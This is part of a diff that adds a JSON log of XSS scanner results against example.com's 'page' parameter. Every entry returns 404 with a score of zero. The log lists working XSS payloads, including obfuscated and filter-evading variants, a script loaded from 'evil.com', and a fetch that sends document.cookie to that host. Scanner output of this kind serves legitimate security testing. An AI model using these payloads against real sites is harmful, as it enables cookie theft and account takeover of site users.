+    "url": "http://example.com/search?q=test&page=%3Ca+href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick+me%3C%2Fa%3E",
+    "param": "page",
+    "payload": "<a href=\"javascript:alert('XSS')\">Click me</a>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 546,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E",
+    "param": "page",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cbody+onload%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "<body onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 538,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscript%3Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41%29%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 512,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cimg+src%3D%22x%22+onerror%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%22%3E",
+    "param": "page",
+    "payload": "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 519,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Csvg%2Fonload%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "<svg/onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3CSVG%2FONLOAD%3DALERT%28%27XSS%27%29%3E",
+    "param": "page",
+    "payload": "<SVG/ONLOAD=ALERT('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscript+src%3D%2F%2Fevil.com%2Fxss.js%3E%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<script src=//evil.com/xss.js></script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 513,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "\"><script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 512,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "'><script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 538,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 504,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "'><img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 510,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<scr<script>ipt>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 499,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscript%3Efetch%28%27https%3A%2F%2Fevil.com%2F%27%2Bdocument.cookie%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<script>fetch('https://evil.com/'+document.cookie)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 531,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<scr<script>ipt>alert('XSS')</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  }
+]
